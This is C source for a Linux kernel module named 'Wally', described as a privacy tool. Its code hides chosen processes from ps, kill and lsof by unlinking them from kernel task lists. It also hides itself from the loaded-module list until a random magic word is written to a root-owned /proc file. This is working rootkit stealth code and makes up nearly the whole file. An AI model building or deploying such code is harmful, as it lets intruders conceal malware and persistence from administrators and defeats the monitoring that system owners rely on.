/**
 * Wally simple privacy tool
 *
 * Written by hash <carloslack@gmail.com>
 * Sat Sep  6 22:29:12 BRT 2014
 *
 * Where is Wally?!
 *
 * This simple code hides user tasks
 * from userland tools by unlinking
 * internal kernel data structures making
 * it not visible for userland tools. It is
 * important to say that it is not achieved by
 * simply hooking system calls like sys_write()
 * and alike, which would be a silly trick by simpling
 * not showing tasks presence to user, this is actually
 * achieved by unhashing tasks references from internal
 * kernel lists, the ones that in the end would be displayed
 * to the system by means of /proc interface subsystem.
 *
 * Tasks hidden this way stop making part of /proc
 * subsystem then it is not possible for userland
 * tools to list then.
 *
 * User commands like kill, ps, lsof and so on would not
 * find such tasks.
 *
 */
#include <linux/export.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/moduleparam.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

#include "kernel_addr.h"
#include "randbytes.h"

#define MAX_PROCFS_SIZE 64
#define MAX_MAGIC_WORD_SIZE MAX_PROCFS_SIZE
#ifndef WALLY_PROC_FILE
#error "Missing \'WALLY_PROC_FILE\' compilation directive. See Makefile."
#endif

extern void hide_task_by_pid(pid_t pid);
extern void wally_list_saved_tasks(void);
extern void wally_data_cleanup(void);

static struct proc_dir_entry *WallyProcFileEntry;
struct __lkm_access_t{ struct module *this_mod; };
static char *magic_word;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,0,0)
#error "Unsupported kernel version"
#endif

#define WALLY_DECLARE_MOD(x)                                            \
    MODULE_LICENSE("GPL");                                              \
    MODULE_AUTHOR("Carlos Carvalho <carloslack@gmail.com>");            \
    MODULE_DESCRIPTION("Wally - privacy module for paranoid people");   \
    static struct list_head *mod_list;                                  \
    static const struct __lkm_access_t lkm_access_##x = {               \
        .this_mod = THIS_MODULE,                                        \
    };                                                                  \
    void wally_hide_mod(void) {                                         \
          if(!mod_list) {                                               \
               mod_list = lkm_access_##x.this_mod->list.prev;           \
               list_del(&(lkm_access_##x.this_mod->list));              \
            }                                                           \
    }                                                                   \
    void wally_unhide_mod(void) {                                       \
          if(mod_list) {                                                \
               list_add(&(lkm_access_##x.this_mod->list), mod_list);    \
               mod_list = NULL;                                         \
            }                                                           \
    }
WALLY_DECLARE_MOD(wally);

static char*
get_unhide_magic_word(void)
{
   if(!magic_word)
        magic_word = wally_random_bytes(MAX_MAGIC_WORD_SIZE);

   /* magic_word must be freed later */
   return magic_word;
}

static int
proc_dummy_show(struct seq_file *seq, void *data)
{
   seq_printf(seq, "Where is Wally?\n");
   return 0;
}

static int
open_cb(struct inode *ino, struct file *fptr)
{
   return single_open(fptr, proc_dummy_show, NULL);
}

static ssize_t
write_cb(struct file *fptr, const char __user *user, size_t size, loff_t *offset)
{
   char buf[MAX_PROCFS_SIZE+1];
   unsigned long bufsiz = 0;
   static unsigned int op_lock;
   pid_t pid;
   memset(buf, 0, MAX_PROCFS_SIZE+1);

   bufsiz = size < MAX_PROCFS_SIZE ? size : MAX_PROCFS_SIZE;

   if (copy_from_user(buf, user, bufsiz))
     goto efault_error;

   pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
   if((pid > 1) && (pid <= 65535 /* 16 bit range pids */))
     {
        hide_task_by_pid(pid);
     }
   else
     {
        size_t len = strlen(buf) - 1;
        if(!len || (len < 0))
          goto leave;

        buf[len] == '\n' ? buf[len] = '\0' : 0;
        if(!strcmp(buf, "hide") && !op_lock)
          {
             static unsigned int msg_lock = 0;
             if(!msg_lock)
               {
                  msg_lock = 1;
                  printk(KERN_WARNING
                         "Your module \'unhide\' magic word is: '%s'\n", magic_word);
               }
             op_lock = 1;
             wally_hide_mod();
          }
        else if(!strcmp(buf, magic_word) && op_lock)
          {
             op_lock = 0;
             wally_unhide_mod();
          }
        else if(!strcmp(buf, "list"))
          {
             wally_list_saved_tasks();
          }
     }
leave:
   return size;
efault_error:
   return -EFAULT;
}

/**
 * proc file callbacks and defs
 */
static const struct file_operations proc_file_fops = {
 .owner =   THIS_MODULE,
 .open  =   open_cb,
 .read  =   seq_read,
 .release = seq_release,
 .write =   write_cb,
};

static void do_remove_proc(void)
{
   if(WallyProcFileEntry)
     {
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
        remove_proc_entry(WALLY_PROC_FILE, NULL);
#else
        proc_remove(WallyProcFileEntry);
#endif
     }
}

static int __init wally_init(void)
{
   int lock = 0;

   kall_load_addr(); /* load kallsyms addresses */
   if(!k_attach_pid)
     goto addr_error;

   if(!get_unhide_magic_word())
     goto magic_word_error;


try_reload:
    WallyProcFileEntry = proc_create(WALLY_PROC_FILE, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
    if(lock && !WallyProcFileEntry)
      {
         goto proc_file_error;
      }
    if(!lock)
      {
         if(!WallyProcFileEntry)
           {
              lock = 1;
              do_remove_proc();
              goto try_reload;
           }
      }

    /* set proc file maximum size & user as root */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
    WallyProcFileEntry->size = MAX_PROCFS_SIZE;
    WallyProcFileEntry->uid = 0;
    WallyProcFileEntry->gid = 0;
#else
   proc_set_size(WallyProcFileEntry, MAX_PROCFS_SIZE);
   proc_set_user(WallyProcFileEntry, 0, 0);
#endif

   goto leave;
proc_file_error:
   printk(KERN_ERR "Could not create proc file.\n");
   goto leave;
addr_error:
   printk(KERN_ERR "Could not get kernel function address, proc file not created.\n");
   goto leave;
magic_word_error:
   printk(KERN_ERR "Could not load magic word. proc file not created\n");
leave:
   printk(KERN_INFO "wally loaded.\n");
   return 0;
}

static void __exit wally_cleanup(void)
{
   if(magic_word != NULL)
        kfree(magic_word);

   wally_data_cleanup();
   do_remove_proc();
   printk(KERN_INFO "wally unloaded.\n");
}

module_init(wally_init);
module_exit(wally_cleanup);
